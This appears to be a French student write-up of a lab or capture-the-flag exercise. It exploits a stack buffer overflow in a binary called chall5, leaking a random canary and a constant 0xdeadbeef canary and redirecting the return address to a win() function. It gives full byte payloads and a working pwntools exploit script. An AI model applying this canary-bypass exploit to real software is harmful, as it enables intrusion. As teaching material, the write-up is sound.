## 8.1

Il y a un canary, ce qui empêche les attaques avec du stack smashing simple.

## 8.2

# secure_login
||||||
|---|---|---|---|---|
|   |   |   |   |   |
|-0x3FC |local_400  |char[504]  |pwd        |   |
|-0x204 |local_208  |char[500]  |usrname    |   |
|-0x10  |local_14   |4 bytes    |win canary |   |
|-0xC   |local_10   |4 bytes    |canary     |   |
|0      |ebp        |           |           |   |
|+4     |eip        |           |           |   |
|       |           |           |           |   |

## 8.3

eip de secure_login. Comme ça le retour nous amène à la fonction win qui va afficher le mdp dans le terminal. On peut le faire car les inputs utilisateurs sont gérés par une fonction secure_read() qui accepte des inputs plus grands que la taille des buffers dans lesquels les inputs sont stockés (username et mdp sont dans des buffers de 500 et 504 bytes, et secure_read accepte 2016 bytes) et elle ne vérifie pas que les inputs ne dépassent pas 500 bytes. 

## 8.4

Payload pour démontrer l'efficacité du canary:

Dans le buffer mot de passe:
b"\x31"*1024 + b"\xa6\x86\x04\x08"

b"\xa6\x86\x04\x08" : adresse de la fonction win qu'on met dans eip pour que le retour nous y amène 

b"\x31"*1024 : padding pour arriver à eip (depuis le buffer mot de passe)

Avec ce payload, le programme va avoir une erreur stack smashing detected

## 8.5

Il faut connaître le canary et le réecrire dans le payload pour que la vérification en fin de fonction ne détecte pas qu'on a modifié la pile. On peut connaître le canary car la fonction qui copie l'input utilisateur n'ajoute pas de \0 automatiquement à la fin, il copie seulement dans un buffer rempli de \0. Ca veut dire que si on écrit un username qui écrase tous les charactères de son buffer, lorsque le programme afficher l'username, il va aussi afficher ce qu'il y a après dans la pile.

On peut donc afficher le canary en entrant l'username puis réecrire la pile avec le bon canary en entrant le mot de passe.

## 8.6

Payload dans username:
b"\x31"*505

Les 504 premiers bytes permettent de parcourir la pile jusqu'au canary. Le 505 ème byte permet d'écrire par dessus le premier byte du canary qui est '\0' et nous empêche de l'afficher sur le terminal

Payload dans password:
b"\x31"*1008+ b"\x00" + canary + b"\x30"*12 + b"\xa6\x86\x04\x08"

1008 bytes: padding pour arriver au canary.
b"\x00" : premier byte du canary
canary: 3 premiers bytes qu'on a print sur le terminal avec le premier payload
b"\x30"*12 : padding pour arriver à eip
b"\xa6\x86\x04\x08" : adresse de la fonction win

## 8.7

Oui, car on a remplacé l'adresse de win dans l'adresse de retour de la fonction et le canary est la valeur correcte. On arrive bien dans win et on voit ADMIN ACCESS GRANTED dans le terminal. On n'affiche par contre pas le flag, car dans la fonction win, une vérification d'un canary est faite. Dans la fonction secure_login il y a une sorte de canary supplémentaire qui se trouve dans la pile juste avant le canary qu'on a déjà copié.

## 8.8
Payload dans username:
b"\x31"*500

permet d'afficher le canary qui est vérifié dans win. Contrairement au canary qui est vérifié avant le return, celui ci n'est pas généré aléatoirement. Ce canary est constant, on peut donc le trouver avec une première exécution et faire notre exploit dans une autre exécution du programme.

On trouve que ce canary a la valeur: b"\xef\xbe\xad\xde"

Payload dans unsername:
b"\x31"*505

Rien ne change pour celui-ci

Payload dans password:
b"\x31"*1004 + b"\xef\xbe\xad\xde" + b"\x00" + canary + b"\x30"*12 + b"\xa6\x86\x04\x08"

b"\x31"*1004 : padding jusqu'au canary constant

b"\xef\xbe\xad\xde" : valeur du canary constant

b"\x00" + canary : comme avant, permier byte du canary est \x00 suivi des 3 premiers bytes qu'on a print sur le terminal avec le premier payload

b"\x30"*12 : padding pour arriver à eip

b"\xa6\x86\x04\x08" : adresse de la fonction win

## 8.9

```py
from pwn import *

#start process with binary chall5
proc = process('./chall5')

#receive lines from chall5 until ': ' is received, this is when the program prompts the user for a username
line = proc.recvuntil(b": ")

#build and send payload to print the constant canary
input_string = (b"\x31"*500)
proc.sendline(input_string)

#receive lines until the program prompts the user for a password (it will print the username and what follows in the stack)
line = proc.recvuntil(b": ")
print(b"line after You Entered: ", line)

#get and print the canary from the program output
canary = line[518:522]
print("bytes: ", canary)
```

```py
from pwn import *

#start process with binary chall5
proc = process('./chall5')

#receive lines from chall5 until ': ' is received, this is when the program prompts the user for a username
line = proc.recvuntil(b": ")

#build and send payload to print the random canary
input_string = (b"\x31"*505)
proc.sendline(input_string)

#receive lines until the program prompts the user for a password
line = proc.recvuntil(b": ")
print(b"line after You Entered: ", line)

#get the 3 bytes of the canary from the output
canary = line[523:526]
print("bytes: ", canary)

#build and send the payload with both canaries and the address of win()
input_string = (b"\x31"*1004 + b"\xef\xbe\xad\xde" + b"\x00" + canary + b"\x30"*12 + b"\xa6\x86\x04\x08")
proc.sendline(input_string)

#receive and print lines until the content of flags is printed by the program
print(proc.recvline().decode())
print(proc.recvline().decode())
print(proc.recvline().decode())
print(proc.recvline().decode())
print(proc.recvline().decode())
print(proc.recvline().decode())
print(proc.recvline().decode())
```

## 8.10

Si on arrive a retourner sur la fonction win mais qu'on arrive pas à afficher le mot de passe, on a probablement pas recopié le canary constant. Dans win, une vérification de ce canary est faite et le flag est affiché seulement s'il est correct. Sinon, un exit(-1) est appelé.

## 8.11

Comme vu avant, il faut au préalable faire une exécution avec un payload de 500 bytes quelconques pour afficher le canary constant 0xdeadbeef. Ensuite, on peut faire notre attaque décrite avant avec le canary constant écrit juste avant le canary aléatoire dans la pile